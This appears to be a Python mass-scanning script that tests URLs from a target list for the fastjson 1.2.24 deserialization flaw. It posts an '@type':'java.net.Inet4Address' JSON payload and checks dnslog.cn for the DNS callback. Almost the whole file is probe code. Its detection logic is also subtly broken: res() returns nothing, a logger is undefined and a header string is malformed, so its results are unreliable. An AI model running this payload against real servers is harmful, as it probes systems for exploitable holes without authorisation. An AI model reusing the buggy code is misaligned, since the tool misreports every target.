import requests
import re
import time
import threading



#获取DNSlog类
class Dnslog:
    def __init__(self):
        self.getdnssub_url = 'http://www.dnslog.cn/getdomain.php'
        self.getres_url = 'http://www.dnslog.cn/getrecords.php'
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X ',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        self.s = requests.session()  # 这里顶一个session，同一个session可以拿到之前获取到的子域名的日志啦

    def req(self):  # 获取请求到的dnslog随机子域名
        try:
            response_getdnsurl = requests.get(url=self.getdnssub_url, headers=self.headers)
            dnscode = response_getdnsurl.text
            cookie = response_getdnsurl.cookies
            cookies = requests.utils.dict_from_cookiejar(cookie)
            self.PHPSESSID = cookies['PHPSESSID']
            return dnscode
        except Exception as e:
            logger.error(str(e))
            return None

    def res(self):  # 获取dnslog随机子域名的dns查询日志
        try:
            headers_seesion = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': "PHPSESSID=%s" % self.PHPSESSID}
            print(self.getres_url)
            response_dns = requests.get(url=self.getres_url, headers=headers_seesion)
            print(response_dns.text)
        except Exception as e:
            logger.error(str(e))
            return None


#检测fastjson
def fastjson_check(url):
    dnslog=Dnslog()
    dnslogreq=dnslog.req()
    headers = {
        "User-Agent":"User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0"
    }
    print(url)
    data = '{"zeo":{"@type":"java.net.Inet4Address","val":"'+url+'.'+dnslogreq+'"}}'
    print(data)

    try:
        res = requests.post(url=url,headers=headers,data=data,timeout=20)
    except:
        print (url+'访问失败，请重试或检查网络')
        with open('result.txt','a+') as f:
            f.write('[-]'+url+'  网络请求失败\n')

    try:
        dnslogres=dnslog.res()
        print(dnslogres)
        if res.status_code==500 and dnslogreq in dnslogres:
            print(url+'  存在fastjson反序列化漏洞')
            with open('result.txt','a+') as f:
                f.write('[+]'+url+'TRUE\n')
    except:
        print (url+'  不存在fastjson反序列化漏洞')
        with open('result.txt','a+') as f:
            f.write('[-]'+url+'FALSE\n')
        

    time.sleep(3)



        
if __name__ == "__main__":
    hosts_list = []
    with open('result.txt','a+') as f:
            f.write('------------------'+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+'------------------\n')
    print ('------------------------------------fastjson1.2.24漏洞检测中------------------------------------')
    for target in open('target.txt'):
        #print (target.strip())
        fastjson_check(target.strip())
    
